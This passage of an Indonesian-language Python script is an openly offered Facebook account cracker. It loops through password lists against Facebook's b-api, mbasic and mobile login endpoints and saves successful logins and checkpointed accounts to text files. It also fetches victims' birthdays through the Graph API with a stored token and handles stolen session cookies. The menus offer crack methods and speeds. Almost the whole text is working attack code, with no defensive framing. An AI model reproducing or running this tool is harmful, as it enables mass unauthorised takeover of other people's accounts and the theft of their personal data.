                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        boy_hamzah("\r\033[0;93mCHECK %s - %s %s %s %s%s"%(fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
                        cek_log(fl.get("id"),i,h_cp)
                        boy_hamzah("")
                        self.cp.append("%s - %s %s%s%s"%(fl.get("id"),i,d,m,y))
                        open("checkpoint.txt","a+").write("%s - %s %s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    boy_hamzah("\r\033[0;93mCHECK %s - %s%s     "%(fl.get("id"),i,tahun(fl.get("id"))))
                    cek_log(fl.get("id"),i,h_cp)
                    boy_hamzah("")
                    self.cp.append("%s - %s"%(fl.get("id"),i))
                    open("checkpoint.txt","a+").write("%s - %s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    boy_hamzah("\r\033[0;92mRESULTS %s - %s%s     "%(fl.get("id"),i,tahun(fl.get("id"))))
                    boy_hamzah("")
                    self.ada.append("%s - %s"%(fl.get("id"),i))
                    open("multiresults.txt","a+").write("%s - %s\n"%(fl.get("id"),i))
                    break
                else:continue
            self.ko+=1
            boy_hamzah("\r\033[0m[ %s-%s ] \033[0;92mRESULTS [ %s ] \033[0;93mCHECK [ %s ]"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end='');sys.stdout.flush()
        except:
            self.api_opsi(fl)
    def mbasic(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_mbasic(fl.get("id"),i,"https://mbasic.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = _req_get_("https://graph.facebook.com/" + fl.get("id") + "?fields=name,id,birthday,first_name,middle_name,last_name,name_format,picture,short_name&access_token=" + hamzah("token.txt","r").read())
                        tt = _js_lo_(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        print("\r\033[0;93mCHECK %s - %s %s %s %s%s"%(fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
                        self.cp.append("%s - %s %s%s%s"%(fl.get("id"),i,d,m,y))
                        open("checkpoint.txt","a+").write("%s - %s %s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    print("\r\033[0;93mCHECK %s - %s%s     "%(fl.get("id"),i,tahun(fl.get("id"))))
                    self.cp.append("%s - %s"%(fl.get("id"),i))
                    open("checkpoint.txt","a+").write("%s - %s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    h_ok = "\r\033[0;92mRESULTS %s - %s %s%s     "%(fl.get("id"),i,tahun(fl.get("id")))
                    cek_apk(h_ok,koki(log.get("cookies")))
                    self.ada.append("%s - %s"%(fl.get("id"),i))
                    open("multiresults.txt","a+").write("%s - %s\n"%(fl.get("id"),i))
                    break
                else:continue
            self.ko+=1
            print("\r\033[0m[ %s-%s ] \033[0;92mRESULTS [ %s ] \033[0;93mCHECK [ %s ]"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end='');sys.stdout.flush()
        except:
            self.mbasic(fl)
    def mbasic_opsi(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_mbasic(fl.get("id"),i,"https://mbasic.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = _req_get_("https://graph.facebook.com/" + fl.get("id") + "?fields=name,id,birthday,first_name,middle_name,last_name,name_format,picture,short_name&access_token=" + hamzah("token.txt","r").read())
                        tt = _js_lo_(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        h_cp = "\r\033[0;92mCHECK %s - %s - %s %s %s%s"%(fl.get("id"),i,d,m,y,tahun(fl.get("id")))
                        cek_log(fl.get("id"),i,h_cp)
                        boy_hamzah("")
                        self.cp.append("%s - %s"%(fl.get("id"),i))
                        open("checkpoint.txt","a+").write("%s - %s\n"%(fl.get("id"),i))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    h_cp = "\r\033[0;93mCHECK %s - %s%s     "%(fl.get("id"),i,tahun(fl.get("id")))
                    cek_log(fl.get("id"),i,h_cp)
                    boy_hamzah("")
                    self.cp.append("%s - %s"%(fl.get("id"),i))
                    open("checkpoint.txt","a+").write("%s - %s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    h_ok = "\r\033[0;92mRESULTS %s - %s%s%s     "%(fl.get("id"),i,tahun(fl.get("id")),P)
                    cek_apk(h_ok,koki(log.get("cookies")))
                    boy_hamzah("")
                    self.ada.append("%s - %s"%(fl.get("id"),i))
                    open("multiresults.txt","a+").write("%s - %s\n"%(fl.get("id"),i))
                    break
                else:continue
            self.ko+=1
            print("\r\033[0m[ %s-%s ] \033[0;92mRESULTS [ %s ] \033[0;93mCHECK [ %s ]"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end='');sys.stdout.flush()
        except:
            self.mbasic_opsi(fl)
    def m(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_m(fl.get("id"),i,"https://m.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = _req_get_("https://graph.facebook.com/" + fl.get("id") + "?fields=name,id,birthday,first_name,middle_name,last_name,name_format,picture,short_name&access_token=" + hamzah("token.txt","r").read())
                        tt = _js_lo_(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        boy_hamzah("\r\033[0;93mCHECK %s - %s %s %s %s%s"%(fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
                        self.cp.append("%s - %s %s%s%s"%(fl.get("id"),i,d,m,y))
                        open("checkpoint.txt","a+").write("%s - %s %s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    boy_hamzah("\r\033[0;93mCHECK %s - %s%s     "%(fl.get("id"),i,tahun(fl.get("id"))))
                    self.cp.append("%s - %s"%(fl.get("id"),i))
                    open("checkpoint.txt","a+").write("%s - %s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    h_ok = "\r\033[0;92mRESULTS %s - %s %s%s     "%(fl.get("id"),i,tahun(fl.get("id")))
                    cek_apk(h_ok,koki(log.get("cookies")))
                    self.ada.append("%s - %s"%(fl.get("id"),i))
                    open("multiresults.txt","a+").write("%s - %s\n"%(fl.get("id"),i))
                    break
                else:continue
            self.ko+=1
            boy_hamzah("\r\033[0m[ %s-%s ] \033[0;92mRESULTS [ %s ] \033[0;93mCHECK [ %s ]"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end='');sys.stdout.flush()
        except:
            self.m(fl)
    def m_opsi(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_m(fl.get("id"),i,"https://m.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = _req_get_("https://graph.facebook.com/" + fl.get("id") + "?fields=name,id,birthday,first_name,middle_name,last_name,name_format,picture,short_name&access_token=" + open("token.txt","r").read())
                        tt = _js_lo_(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        h_cp = "\r\033[0;92mCHECK %s - %s - %s %s %s%s"%(fl.get("id"),i,d,m,y,tahun(fl.get("id")))
                        cek_log(fl.get("id"),i,h_cp)
                        boy_hamzah("")
                        self.cp.append("%s - %s"%(fl.get("id"),i))
                        open("checkpoint.txt","a+").write("%s - %s\n"%(fl.get("id"),i))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    h_cp = "\r\033[0;93mCHECK %s - %s%s%s     "%(fl.get("id"),i,tahun(fl.get("id")),P)
                    cek_log(fl.get("id"),i,h_cp)
                    boy_hamzah("")
                    self.ada.append("%s - %s"%(fl.get("id"),i))
                    hamzah("checkpoint.txt","a+").write("%s - %s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    h_ok = "\r\033[0;92mRESULTS %s - %s%s%s     "%(fl.get("id"),i,tahun(fl.get("id")),P)
                    cek_apk(h_ok,koki(log.get("cookies")))
                    boy_hamzah("")
                    self.ada.append("%s - %s"%(fl.get("id"),i))
                    hamzah("multiresults.txt","a+").write("%s - %s\n"%(fl.get("id"),i))
                    break
                else:continue
            self.ko+=1
            print("\r\033[0m[ %s-%s ] \033[0;92mRESULTS [ %s ] \033[0;93mCHECK [ %s ]"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end='');sys.stdout.flush()
        except:
            self.m_opsi(fl)
def info_penting():
	jalan('\nDi Larang Menjual Atau Membelikan Script Mbf Ini \nKarna Saya Membuat Script ini Secara Gratis Untuk Semua')
def var_menu():
    boy_hamzah('\n01.) Masuk Menggunakan Cookie')
    boy_hamzah('02.) Info Penting')
    boy_hamzah('00.) Keluar')
def start_method():
    boy_hamzah('\n\t         PILIH METODE CRACK NYA\n\n01.) Metode [ b-api ]')
    boy_hamzah('02.) Metode [ mbasic ]')
    boy_hamzah('03.) Metode [ mobile.FB ]')
def start_methodezz():
    boy_hamzah('\n01.) Crack Cepat [ HASIL DIKIT ]')
    boy_hamzah('02.) Crack Lambat [ Hasil Lumayan ]')
    boy_hamzah('03.) Crack + Lambat [ Hasil Memuaskan ] ')
    boy_hamzah('04.) Crack Sandi Tambahan')
def started():
    boy_hamzah('\nHasil RESULTS Tersimpan Di > multiresults.txt')
    boy_hamzah('Hasil CHECK Tersimpan Di > checkpoint.txt')
    boy_hamzah('\n\t          SEMOGA BERUNTUNG')
    boy_hamzah('')

if __name__=='__main__':
  os.system('git pull')
  clear()
  menu()
